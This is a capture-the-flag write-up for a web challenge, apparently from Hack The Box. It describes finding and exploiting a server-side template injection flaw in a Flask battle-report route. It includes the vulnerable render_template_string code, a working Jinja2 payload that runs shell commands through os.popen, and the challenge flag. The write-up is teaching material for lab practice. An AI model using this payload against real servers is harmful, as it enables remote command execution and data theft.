# 🔥 Trial by Fire - Writeup

**Category:** Web  
**Points:** 50  
**Description:**  
> Deep within the Flame Peaks, a legendary Fire Drake tests the strength and resolve of those who seek the Emberstone. Defeat is expected—but perhaps victory lies not in brute force, but in clever trickery.

---

## 🧩 Reconnaissance

Landing on the page, you’re greeted with a retro-style battle interface. After choosing a warrior name, you enter a turn-based combat scenario against a Fire Drake with **1337 HP**.

Fighting the dragon normally proves fruitless—the damage dealt is minimal and defeat is inevitable.

However, viewing the **page source** reveals a suspicious hint:

```html
Can you read the runes? Perhaps {{ 7 * 7 }} is the key. <!-- SSTI -->
```
The output shows 49 in the rendered page, confirming a Server-Side Template Injection (SSTI) vulnerability.
🔍 Application Behavior

Upon losing a battle, you’re shown a battle report summarizing your stats and outcome. Intercepting the request reveals that data is POSTed to /battle-report.

A closer look at the source shows this route renders user-supplied data directly:
```python
@web.route('/battle-report', methods=['POST'])
def battle_report():
    ...
    REPORT_TEMPLATE = f""" 
        ...
        <p>🗡️ Damage Dealt: <span class="nes-text is-success">{stats['damage_dealt']}</span></p>
        ...
    """
    return render_template_string(REPORT_TEMPLATE)
```

Because render_template_string is used on raw form data, and the values aren’t sanitized, this is a textbook SSTI vulnerability.
🛠️ Exploitation

We can inject Python expressions via the damage_dealt field (or others) to execute code server-side.

Intercept the POST request to /battle-report after a battle using Burp Suite (or your preferred tool), and modify it like so:

```
POST /battle-report HTTP/1.1
Host: target

damage_dealt={{config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read()}}&
damage_taken=100&
spells_cast=2&
turns_survived=3&
outcome=defeat&
battle_duration=18.116
```

    Note: Use + instead of spaces (e.g., cat+flag.txt) if the application filters certain characters.

Upon submitting the modified request, the flag will be rendered directly into the battle report page under “Damage Dealt”.
🏁 Flag

Flag:

```HTB{Fl4m3_P34ks_Tr14l_Burn5_Br1ght_cce96f85ad54b396cdee745fbe91bf5b}```

